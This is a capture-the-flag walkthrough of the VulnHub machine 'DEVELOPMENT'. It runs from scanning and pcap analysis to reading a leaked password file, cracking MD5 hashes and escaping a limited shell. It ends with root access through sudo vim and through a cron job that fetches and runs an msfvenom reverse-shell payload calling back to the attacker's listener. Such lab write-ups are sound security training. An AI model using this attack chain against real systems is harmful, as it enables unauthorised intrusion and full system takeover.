---
title: VulnHub - digitalworld.local DEVELOPMENT
author: ret2x
date: 2021-04-23 13:22:40 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, rfi]
image:
    path: /assets/images/development/front.png
---

**Description:** A linux machine whose enumeration on the web application uncovered many vulnerabilities of which File Disclosure was taken advantage to gain the first foothold. Due to inappropriate sudo settings root privileges were obtained.

**Author:** Donavan

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/digitalworldlocal-development,280/](https://www.vulnhub.com/entry/digitalworldlocal-development,280/)

## Information Gathering
### Host Discovery

Let's start discovering our target with netdiscover, as shown below:

```console
root@kali:~$ netdiscover -i vmnet1 -r 192.168.179.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts 

 5 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 282 
 __________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname  
 --------------------------------------------------------------------------
 192.168.179.130 00:0c:29:9e:13:ea      4     240  VMware, Inc.        
 192.168.179.254 00:50:56:ec:79:b5      1      42  VMware, Inc.       
```

### Port Scanning

Discovered the target is time to enumerate all TCP open ports, for this I used nmap whith the following instruction:

```console
root@kali:~$ nmap -n -v -T4 -p- 192.168.179.130 -oG tcp-scan-all-ports.txt
...
PORT     STATE SERVICE
22/tcp   open  ssh
113/tcp  open  ident
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy
MAC Address: 00:0C:29:9E:13:EA (VMware)
...
```

### Service Enumeration

With nmap I proceeded to perform an aggressive scan to enumerate services and versions running on open ports.

```console
root@kali:~$ nmap -n -v -A -p22,113,139,445,8080 -Pn 192.168.179.130 -oN tcp-service-enumeration.txt
...
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:07:2b:2c:2c:4e:14:0a:e7:b3:63:46:c6:b3:ad:16 (RSA)
|_  256 24:6b:85:e3:ab:90:5c:ec:d5:83:49:54:cd:98:31:95 (ED25519)
113/tcp  open  ident?
|_auth-owners: oident
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_auth-owners: root
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
|_auth-owners: root
8080/tcp open  http-proxy  IIS 6.0
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 29 Jun 2021 20:16:34 GMT
|     Server: IIS 6.0
|     Last-Modified: Wed, 26 Dec 2018 01:55:41 GMT
|     ETag: "230-57de32091ad69"
|     Accept-Ranges: bytes
|     Content-Length: 560
|     Vary: Accept-Encoding
|     Connection: close
|     Content-Type: text/html
|     <html>
|     <head><title>DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!</title>
|     </head>
|     <body>
|     <p>Welcome to the Development Page.</p>
|     <br/>
|     <p>There are many projects in this box. View some of these projects at html_pages.</p>
|     <br/>
|     <p>WARNING! We are experimenting a host-based intrusion detection system. Report all false positives to patrick@goodtech.com.sg.</p>
|     <br/>
|     <br/>
|     <br/>
|     <hr>
|     <i>Powered by IIS 6.0</i>
|     </body>
|     <!-- Searching for development secret page... where could it be? -->
|     <!-- Patrick, Head of Development-->
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 29 Jun 2021 20:16:35 GMT
|     Server: IIS 6.0
|     Allow: GET,POST,OPTIONS,HEAD
|     Content-Length: 0
|     Connection: close
|     Content-Type: text/html
...
```

### Web Enumeration

We focus on port 8080, browsing the web page we see a message, for view some of the projects visit **html_pages**.

![](/assets/images/development/screenshot-1.png)

We visit that resource and find a list of web file names. 

![](/assets/images/development/screenshot-2.png)

Enumerating these web files, in the downloads.html resource, visiting the page source I found the name of a pcap file, as shown in the following screenshots:

![](/assets/images/development/screenshot-3.png)

![](/assets/images/development/screenshot-4.png)

Then I download the test.pcap file with wget and filter this by http requests with tshark.

```console
root@kali:~$ wget 192.168.179.130:8080/test.pcap
root@kali:~$ tshark -r test.pcap -T fields -e http.host -e http.request.uri -Y 'http.request' 2>/dev/null | sort -u | column -t
192.168.254.157:8080  /developmentsecretpage/directortestpagev1.php
192.168.254.160       /qinyi/motivation.html
```

I find a request made to port 8080, I access this URL and we are presented an alert box, the same one that redirects us to the director page, then log out this page.

![](/assets/images/development/screenshot-5.png)

![](/assets/images/development/screenshot-6.png)

We try to log in to this login page with **admin:admin** or any credential.

![](/assets/images/development/screenshot-7.png)

We see the following error, I googled and find that it is a **Simple Tex-File Login script (SiTeFilo)** and is vulnerable to File Disclosure/Remote File Inclusion, the exploit you can find here [https://www.exploit-db.com/exploits/7444](https://www.exploit-db.com/exploits/7444)

![](/assets/images/development/screenshot-8.png)


## Exploitation
### File Disclosure

I Download the exploit to the attacking machine and we review its content.

```console
root@kali:~$ wget https://www.exploit-db.com/download/7444
root@kali:~$ less 7444.txt
...
[0x02] Bug:[Remote File Inclusion]

[!] EXPLOIT: /[path]/slogin_lib.inc.php?slogin_path=[remote_txt_shell]
...
[0x03] Bug:[Sensitive Data Disclosure]
...
In this login system, sensible datas like username and password are stored in a local
text file , so we can get sensitive information just going to this txt file . The name of
this file is set in slogin_lib.inc.php. By default is: slog_users.txt

[!] EXPLOIT: /[path]/slog_users.txt
...
```

I tried exploiting by Remote File Inclusion but for some reason it doesn't work and I opt for Sensitive Data Disclosure wich allows me to read usernames and passwords in the **slog_users.txt** file.

![](/assets/images/development/screenshot-9.png)

I downloaded the **slog_users.txt** file and filtered the password hashes to a file called hashes.txt.

```console
root@kali:~$ wget http://192.168.179.130:8080/developmentsecretpage/slog_users.txt
root@kali:~$ cat slog_users.txt 
admin, 3cb1d13bb83ffff2defe8d1443d3a0eb
intern, 4a8a2b374f463b7aedbb44a066363b81
patrick, 87e6d56ce79af90dbe07d387d3d0579e
qiu, ee64497098d0926d198f54f6d5431f98
root@kali:~$ awk '{print $2}' slog_users.txt > hashes.txt
```

I developed a python script to crack these md5 hashes.

```python
#!/usr/bin/env python3

import requests,re

def decrypt(hash):
    try:
        r=requests.get(f"https://md5.gromweb.com/?md5={hash}")
        md5_decrypt=re.findall("\sstring\">(.*?)</.*", r.text)
        return md5_decrypt[0]
    except:
        pass

hashes=open("hashes.txt").read().splitlines()

if __name__=="__main__":
    for hash in hashes:
        cracked=decrypt(hash)
        if cracked:
            print(f"{hash}: {cracked}")
```

We execute the script and obtain the passwords.

```console
root@kali:~$ ./decrypt.py 
4a8a2b374f463b7aedbb44a066363b81: 12345678900987654321
87e6d56ce79af90dbe07d387d3d0579e: P@ssw0rd25
ee64497098d0926d198f54f6d5431f98: qiu
```

We log in to ssh with the username **intern** and password **12345678900987654321** and we have access to a limited shell, to scape this we execute the instruction as shown below: 

```console
root@kali:~$ ssh intern@192.168.179.130 
intern@192.168.179.130's password: 
intern:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
intern:~$ echo os.system("/bin/bash")
intern@development:~$ 
```

I tried to access via ssh with the **patrick** user but he was not allowed, so from the **intern** user I changed to the **patrick** user with the password **P@ssw0rd25**, listing the sudo permissions for this user I found that he was allowed run nano and vim.

```console
intern@development:~$ su patrick
Password: 
patrick@development:/home/intern$ 
patrick@development:~$ sudo -l
Matching Defaults entries for patrick on development:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User patrick may run the following commands on development:
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /bin/nano
patrick@development:~$ 
```

## Privilege Escalation
### Sudo Permissions
**Privilege scalation with vim**

To escalate privileges with vim we will abuse its ability to execute commands, as shown below:

```console
patrick@development:~$ sudo vim -c ':!/bin/bash'

root@development:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Privilege escalation with nano**

Another way to escalate privileges is to create a cron job in the **cron.d** directory to download a linux payload, give it execute permissions, and run it, as shown below:

```console
patrick@development:~$ sudo nano /etc/cron.d/evilcron
```
![](/assets/images/development/screenshot-10.png)

Then we will create a linux payload with the following instruction:

```console
root@kali:~$ msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp LHOST=192.168.179.1 LPORT=443 -f elf -o back.door
```

We set up a nc listener and after a minute the cron job will download and execute the payload giving us a shell, as shown below:

```console
root@kali:~$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.179.130 - - [23/Apr/2021 17:36:01] "GET /back.door HTTP/1.1" 200 -
```

```console
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.130] 36224
id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux development 4.15.0-34-generic #37-Ubuntu SMP Mon Aug 27 15:21:48 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
cat /root/proof.txt
Congratulations on rooting DEVELOPMENT! :)
```

Another way to get root on this box is through kernel exploitation which is vulnerable to [CVE-2018-18955](https://nvd.nist.gov/vuln/detail/CVE-2018-18955), you can find the exploit [here](https://www.exploit-db.com/exploits/47165), or also through **lxd** since the user patrick is member of the group lxd.

